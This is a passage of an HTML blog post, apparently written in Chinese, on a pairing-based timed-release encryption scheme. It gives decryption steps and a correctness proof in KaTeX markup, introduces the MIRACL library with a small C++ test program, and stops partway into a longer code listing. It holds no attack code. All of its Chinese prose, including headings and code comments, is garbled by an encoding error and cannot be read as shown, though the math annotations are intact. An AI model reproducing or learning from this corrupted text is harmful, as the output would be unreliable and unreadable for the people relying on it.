xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo>âˆˆ</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mo>âˆ—</mo></msup></mrow><annotation encoding="application/x-tex">T\in \{0,1\}^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span></span></span></span>ï¼Œä½¿ç”¨è‡ªå·±è®¡ç®—å¾—åˆ°çš„æ—¶é—´é™·é—¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>U</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">U_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>å’Œæ—¶é—´æœåŠ¡å™¨çš„æ—¶é—´é™·é—¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub></mrow><annotation encoding="application/x-tex">S_T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œå®Œæˆå¦‚ä¸‹è§£å¯†æ“ä½œï¼š</p><p>(1)è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><msub><mi>S</mi><mi>T</mi></msub><mo>+</mo><msub><mi>U</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K&#x27;=e(U,S_T+U_T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>(2)è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>âŠ•</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V\oplus H_2(K&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>æ¢å¤æ¶ˆæ¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></p></li></ol><h2 id="æ­£ç¡®æ€§è¯æ˜">æ­£ç¡®æ€§è¯æ˜</h2><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>U</mi><mo separator="true">,</mo><msub><mi>S</mi><mi>T</mi></msub><mo>+</mo><msub><mi>U</mi><mi>T</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>r</mi><mi>P</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mrow><mi>r</mi><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">K&#x27;=e(U,S_T+U_T)=e(rP,(u+s)H_1(T))=e(P,H_1(T))^{r(u+s)}=K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.188em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">u</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>V</mi><mo>âŠ•</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><msup><mi>K</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>V</mi><mo>âŠ•</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi><mo>âŠ•</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>âŠ•</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>=</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">V\oplus H_2(K&#x27;)=V\oplus H_2(K)=M\oplus H_2(K)\oplus H_2(K)=M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span></p><h1 id="Miraclåº“">Miraclåº“</h1><p>MIRACL(Multiprecision Integer and Rational Arithmetic C/c++ Library)æ˜¯ä¸€å¥—ç”±Shamus Software Ltd.æ‰€å¼€å‘çš„ä¸€å¥—å…³äºå¤§æ•°è¿ç®—å‡½æ•°åº“ï¼Œç”¨æ¥è®¾è®¡ä¸å¤§æ•°è¿ç®—ç›¸å…³çš„å¯†ç å­¦ä¹‹åº”ç”¨ï¼ŒåŒ…å«ï¦ºRSA å…¬å¼€å¯†ç å­¦ã€Diffie-Hellmanå¯†é’¥äº¤æ¢(Key Exchange)ã€AESã€DSAæ•°å­—ç­¾åï¼Œè¿˜åŒ…å«ï¦ºè¾ƒæ–°çš„æ¤­åœ†æ›²çº¿å¯†ç å­¦(Elliptic Curve Cryptography)ç­‰ç­‰ã€‚</p><p>Miraclåº“éœ€è¦æ‰‹åŠ¨ä¸‹è½½è°ƒç”¨æ‰èƒ½ä½¿ç”¨ã€‚</p><h2 id="Visual-Studioä¸­ä½¿ç”¨Miraclåº“">Visual Studioä¸­ä½¿ç”¨Miraclåº“</h2><p>å¯ä»¥å‚è€ƒè¿™ä¸ªæ•™ç¨‹ï¼š<a href="https://www.bilibili.com/read/cv7663799">https://www.bilibili.com/read/cv7663799</a></p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;miracl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mirdef.h&quot;</span></span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;miracl.lib&quot;</span>)</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>miracl *mip = <span class="hljs-built_in">mirsys</span>(<span class="hljs-number">500</span>, <span class="hljs-number">16</span>); <span class="hljs-comment">//åˆå§‹åŒ–miraclç³»ç»Ÿ</span><br>big n = <span class="hljs-built_in">mirvar</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">//åˆå§‹åŒ–n,å¿…é¡»æœ‰</span><br><span class="hljs-built_in">cotnum</span>(n, stdout); <span class="hljs-comment">//æ‰“å°n</span><br><span class="hljs-built_in">cinnum</span>(n, stdin); <span class="hljs-comment">//è¾“å…¥n</span><br><span class="hljs-built_in">cotnum</span>(n, stdout); <span class="hljs-comment">//å†æ¬¡æ‰“å°n</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>èƒ½æˆåŠŸè¿è¡Œè¿™ä¸ªæµ‹è¯•ä»£ç è¡¨ç¤ºé™æ€èµ„æºåº“ç¼–è¯‘å®Œæˆå¹¶ä¸”æˆåŠŸå¯¼å…¥ã€‚</p><h2 id="ç»“æ„ä½“è¯´æ˜">ç»“æ„ä½“è¯´æ˜</h2><ul><li>ECnï¼šä»£è¡¨æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹</li><li>Bigï¼šä»£è¡¨ä¸€ä¸ªå¤§æ•´æ•°</li><li>ZZnï¼šè¡¨ç¤ºå¤§æ•´æ•°ï¼ˆå¤§æ•°ï¼‰çš„æ•°æ®ç±»å‹ã€‚ZZn æä¾›äº†ä¸€ä¸ªå¯ä»¥å¤„ç†å¤§æ•°çš„æŠ½è±¡æ¥å£ï¼Œä½¿å¾—åœ¨è¿›è¡Œæ¤­åœ†æ›²çº¿å¯†ç å­¦ç­‰è®¡ç®—æ—¶æ›´åŠ æ–¹ä¾¿å’Œé«˜æ•ˆã€‚</li><li>ZZn2ï¼šäºŒæ¬¡æ‰©å±•æœ‰é™åŸŸä¸Šçš„å…ƒç´ ï¼ŒåŒ…å«ä¸¤ä¸ª ZZnå…ƒç´ ï¼Œåˆ†åˆ«è¡¨ç¤ºäºŒæ¬¡æ‰©åŸŸä¸­çš„å®éƒ¨å’Œè™šéƒ¨ã€‚äºŒæ¬¡æ‰©å±•åŸŸå¯çœ‹ä½œåŠ ä¸Šè™šæ•°çš„æ¤­åœ†æ›²çº¿æœ‰é™åŸŸã€‚</li></ul><h2 id="å‡½æ•°è¯´æ˜">å‡½æ•°è¯´æ˜</h2><ul><li>map_to_pointï¼šå¯¹åº”å…¬å¼ä¸­çš„H1</li><li>H1ï¼šå°†å­—ç¬¦ä¸²å“ˆå¸Œä¸ºä¸€ä¸ªå¤§æ•´æ•°</li><li>H2ï¼šå¯¹åº”å…¬å¼ä¸­çš„H2</li><li>ecapï¼šåŒçº¿æ€§å¯¹è¿ç®—ï¼Œè®¡ç®—æ¤­åœ†æ›²çº¿ä¸Šä¸¤ä¸ªç‚¹ P å’Œ Q çš„é…å¯¹è¿ç®—ç»“æœã€‚</li></ul><h1 id="ä»£ç ç¤ºä¾‹">ä»£ç ç¤ºä¾‹</h1><h2 id="å…·ä½“å®ç°æ–¹æ¡ˆ">å…·ä½“å®ç°æ–¹æ¡ˆ</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span 